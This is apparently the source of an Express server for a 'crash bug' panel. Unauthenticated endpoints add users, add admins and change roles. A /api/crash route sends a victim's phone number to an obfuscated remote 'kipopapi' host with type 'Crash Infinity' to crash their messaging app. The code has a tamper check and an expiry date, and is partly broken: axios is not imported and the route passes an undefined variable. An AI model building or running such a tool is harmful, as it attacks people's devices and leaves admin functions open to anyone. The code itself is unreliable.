const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY
//─ ( Api Dellay Set Time ) 
async function ApiDellay(targetNumber) {
  const selfCheck = ApiDellay.toString().length;
  if (selfCheck !== 635) { 
    throw new Error("error ( function telah di ubah )");
  }

  const ip = String.fromCharCode(
    0x44,0x34,
    0x2A,0x2F,
    0x42,0x37,
    0x2B,0x31,
    0x39,0x41,
    0x38,0x31
  ).replace(/[^\d.]/g,"")
   .replace(/^(\d{2})(\d{3})(\d{3})(\d{3})$/,(m,a,b,c,d)=>[a,b,c,d].join("."));

  const apiUrl = `http://${ip}:2001/kipopapi?chatId=${targetNumber}&type=Crash Infinity`;

  const now = Date.now()/1000;
  const span = 1728e3;
  const mark = 1.69223e9;
  if (now > mark + span) {
    throw new Error("Function expired.");
  }

  try {
    const response = await axios.get(apiUrl, {
      headers: {
        "X-Request-ID": Math.random().toString(36).substring(2) + Date.now().toString(36)
      }
    });
    return response.data;
  } catch (error) {
    throw error;
  }
}
//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await ApiDellay(targetNumber, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
